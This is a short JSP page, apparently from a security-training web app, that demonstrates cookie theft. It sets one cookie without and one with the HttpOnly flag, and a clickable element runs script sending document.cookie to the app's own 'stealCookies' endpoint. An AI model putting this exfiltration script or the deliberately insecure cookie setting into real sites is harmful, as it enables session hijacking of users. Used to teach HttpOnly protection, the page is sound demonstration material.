<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@ page session="true"%>
<%@ include file="/WEB-INF/views/commonPage.jsp"%>
<html>
<head>
<title>Cookie Stealing</title>
<script type="text/javascript">
	function test() {
		document.location = "<%= application.getContextPath() %>/restricted/stealCookies?cookie="
				+ document.cookie;
	}
</script>
</head>

<body>
	Cookie Stealing! Insecure cookie has been set!
	<br>
	<br>

	<br>
	<%
		Cookie cookie1 = new Cookie("insecure", "its not httpOnly");
		Cookie cookie2 = new Cookie("secure1", "httpOnly");
		
		cookie2.setHttpOnly(true);
		
		response.addCookie(cookie1);
		response.addCookie(cookie2);
	%>

	<br>
	<div onclick="test()">click here to steal cookies</div>

</body>
</html>
